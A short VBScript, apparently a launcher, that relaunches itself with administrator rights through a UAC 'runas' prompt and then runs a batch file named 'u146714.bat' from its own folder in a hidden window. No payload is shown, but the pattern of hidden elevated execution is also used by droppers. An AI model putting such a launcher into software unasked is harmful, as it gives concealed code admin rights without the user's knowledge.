If Not WScript.Arguments.Named.Exists("elevated") Then
	Set sh = CreateObject("Shell.Application")
	sh.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34) & " /elevated", "", "runas", 1
	WScript.Quit
End If
Set fs = CreateObject("Scripting.FileSystemObject")
pp = fs.GetParentFolderName(WScript.ScriptFullName)
bp = pp & "\u146714.bat"
If fs.FileExists(bp) Then
	Set sp = WScript.CreateObject("WScript.Shell")
	sp.Run Chr(34) & bp & Chr(34), 0

End If
